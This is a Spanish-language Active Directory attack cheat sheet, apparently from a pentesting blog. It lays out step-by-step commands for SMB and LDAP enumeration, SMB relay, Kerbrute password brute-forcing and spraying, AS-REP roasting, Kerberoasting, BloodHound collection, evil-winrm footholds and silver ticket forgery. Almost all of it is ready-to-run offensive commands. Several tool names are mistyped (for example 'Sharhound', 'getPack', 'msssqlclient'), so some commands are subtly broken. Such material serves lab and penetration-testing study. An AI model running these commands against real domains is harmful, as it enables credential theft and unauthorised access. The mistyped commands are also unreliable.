---
title: Active Directory CheatSheet
---
### 1️⃣ Sacar información smb

🔻 Sacar información `crackmapexec smb <IP>`

-   Requiere autenticación❓
    
    -   ❌ SMB-Relay `responder -I eth0 -dwv` e impacket `impacket-ntrlrelayx -tf target.txt -smb2support` (-c si quiero meter payload)
        
    -   ✅ Sigo enumerando
        

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-2-enumerar-smb "Permalink")2️⃣ Enumerar SMB

🔻 Ver shares & permisos `smbmap -H <IP>`

Listar recursos `smbclient -L <IP>` (-N para null session)

-   Tengo credenciales❓
    
    -   ✅ `smbmap -H <IP> -d <dns> -u '<user>' -p '<pass>'`
        
        -   Conectarme al share
            
            `smbclient -N \\\\IP\Share`
            
        -   Listar un share
            
            -   `smbclient //IP/<SHARE> -U <USER>`
                
            -   `impacket-smbclient <dominio>/user:password@address` (-k para kerberos auth)
                
                -   Descargar el share `smbget -U <User> smb://IP/<SHARE_LOCATION>` / `--download`
    -   `❌ smbclient --no-pass -L //IP`
        
        -   Conectarme al share
            
            `smbclient --no-pass //IP/<Share>`
            
        -   Listar lo que tiene dentro
            
            `smbmap -H <IP> -r <SHARE>`
            
        -   Listar con crackmapexec:
            
            `crackmapexec smb <IP> -u '' -p '' --shares`
            

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-3-rpcclient "Permalink")3️⃣ rpcclient

Tengo credenciales❓

-   ❌ `rpcclient <ip/dns> -U "" -N` (-c para ejecutar comando)
    
-   ✅ `rpcclient <ip/dns> -U "user%pass"`
    
    -   Listar usuarios: `enumdomusers` / `queryuser <RID>`
        
        -   Regex para guardar usuarios en la lista `rpcclient <ip/dns> -U "user%pass" -c "enumdomusers" | grep -oP '\[.*?\]' | tr -d '[]' > users` ( Se puede hacer con la Null session también)
    -   Enumear grupos
        
        `enumdomgroups` / `querygroupmem <GID>`
        
    -   Enumerar información de los usuarios
        
        `querydispinfo`
        

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-4-kerbrute "Permalink")4️⃣ Kerbrute

🔻 Enumerar usuarios:

-   `/opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d <dominio> --dc <ip> <user_list>`
    
    -   Si obtengo users con rpcclient ➡️ usar la lista ▫️
        
    -   Listas útiles
        
        `/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt`
        
        `/usr/share/wordlists/ad/usernames`
        

🔻 Bruteforcear password de un usuario

-   `/opt/kerbrute/dist/kerbrute_linux_amd64 bruteuser -d <dominio> --dc <ip> <password_list> <username>`

🔻Password spraying (probar password para una lista de usuarios)

-   `/opt/kerbrute/dist/kerbrute_linux_amd64 passwordspray -d <dominio> --dc <ip> <user_list> <password>`

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-5-ldapsearch-windapsearch "Permalink")5️⃣ ldapsearch / windapsearch

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-ldapsearch "Permalink")ldapsearch

🔻 Probar credenciales

-   `ldapsearch -x -H ldap://<IP> -D '<domain>\ldap' -w '<password>' -s base -b '' namingcontexts`
    
    -   Son válidas❓
        
        -   ❌ Tira error
            
        -   ✅ Mostrará información.
            

🔻 Tengo credenciales❓

-   ❌ `ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"`
    
    -   Funciona ❓
        
        -   ❌ "bind must be completed"
            
        -   ✅ Mostrará información
            
            -   `windapsearch.py` `-d <dns> --dc-ip <IP> -U`
-   ✅ `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"`
    
    -   Listar todo el DC
        
    -   `ldapsearch -x -H ldap://<IP> -D 'DNS\ldap' -w 'password' -b 'DC=TLD,DC=TLD'`
        
        -   Si quiero ver info sobre usuarios, agregar:
            
            `-b 'CN=Users, DC=TLD, DC=TLD'` al final.
            
        -   Si quiero extraer ordenadores, agregar:
            
            `-b CN=COMPUTERS, DC=TLD, DC=TLD` al final.
            

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-windapsearch "Permalink")**windapsearch**

🔻 Comando general

-   `python3` `windapsearch.py` `--dc-ip <IP> -u <user>@<dns> -p <passwd>`
    
-   Listar (agregar al final de la query):
    
    -   PCs: `--computers`
        
    -   Grupos: `--groups`
        
    -   Usuarios & Domain Admins: `--da`
        
    -   Usuarios privilegiados: `--privileged-users`
        

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-6-dumpear-el-dominio-andamp-info "Permalink")6️⃣ Dumpear el dominio & info

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-ldapdamaindump "Permalink")ldapdamaindump

🔻 Tengo credenciales válidas❓

-   ✅ Dumpeo el dominio y lo abro con firefox/google:
    
    `ldapdomaindump -u <domain>\<USER> -p <PASSWORD> <IP>`
    
-   ❌ No puedo dumpear el dominio
    

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-bloodhoundpy "Permalink")[bloodhound.py](http://bloodhound.py/)

🔻 Tengo credenciales válidas❓

-   ✅ Dumpeo la estructura del dc
    
    `python3 /opt/Bloodhound/bloodhound.py -c All -u '<USER>' -p '<PASS>' -ns <IP> -d <DNS>`
    

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-7-kerberoasting-asrep-roasting "Permalink")7️⃣ Kerberoasting / ASRep-Roasting

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-asrep-roasting "Permalink")ASRep-Roasting

🔻 Tengo lista de usuarios y conozco el DNS❓

-   ❌ Sigo enumerando
    
-   ✅ AS-Rep-Roasting:
    
    `impacket-GetNPUsers <DNS>/ -no-pass -usersfile <user_list>` (-k para kerberos auth)
    

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-kerberoasting "Permalink")Kerberoasting

🔻 Tengo credenciales válidas❓

-   ❌ Seguir enumerando o probar ASRep-Roasting
    
-   ✅ Kerberoasting:
    
    `impacket-GetUserSPNs <DNS>/<user>:<pass> -output <file>`
    

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-8-enumeracion-dentro-de-la-maquina "Permalink")8️⃣ Enumeración dentro de la máquina

#### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-sharphound "Permalink")SharpHound

🔻 Lo subo a la máquina victima:

-   `.\Sharhound.exe -c All`
    
    -   Me devolverá un .zip
        
        -   Lo bajo a mi máquina usando `--download`

# [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-foothold "Permalink")Foothold

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-1-crackmapexec "Permalink")1️⃣ Crackmapexec

🔻Cuando tengo credenciales:

-   `cme smb/winrm <IP> -u <user> -p <password>`
    
-   ✅ Si pone "Pwn3d" ➡️ Puedo usar `evilwinrm` para conectarme:
    
    -   `evilwinrm -i <dns> -u <User> -p <Pass>`
        
    -   `evil-winrm -i <IP> -c <cert.pem> -k <key.pem> -S`
        

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-2-tgt-tgs "Permalink")2️⃣ TGT / TGS

🔻 Probar ataques TGS / TGT explicados anteriormente

-   Me dan credenciales❓
    
    -   ✅ comprobarlas con crackmapexec
        
        -   Me sirven para evilwinrm❓
            
            -   ✅ Las uso para conectarme
                
            -   ❌ Las uso para enumerar smb, bloodhoud, etc.
                

### [](https://viksant.hashnode.dev/active-directory-cheatsheet#heading-3-silver-ticket-attack "Permalink")3️⃣ Silver ticket attack

🔻 Tengo SPN, SID y password de un usuario y quiero acceder a X servicio❓

-   ✅ Silver Ticket Attack: ▫️ Saco SPN con ataque ASRep-Roasting.
    
-   Hasheo la password en un hasher NTLM online
    
-   SID con `impacket-getPack`
    
    -   `impacket-getPac -targetUser administrator <dns>/<user>:<pass>`
-   ▫️ Tengo ya todos los datos❓
    
    -   ✅ Creo el TGS
        
        `impacket-ticketer -nthash <hash> -domain-sid <SID> -domain <dns> -dc-ip <dns> -spn <spn/<puerto< administrator`
        
    -   Lo uso para conectarme:
        
        -   Exporto el ccache file primero `KRB5CCNAME = administrator.ccache`
            
        -   Me conecto: `impacket-msssqlclient -k <DNS>` (depende del servicio. No siempre es mssql)
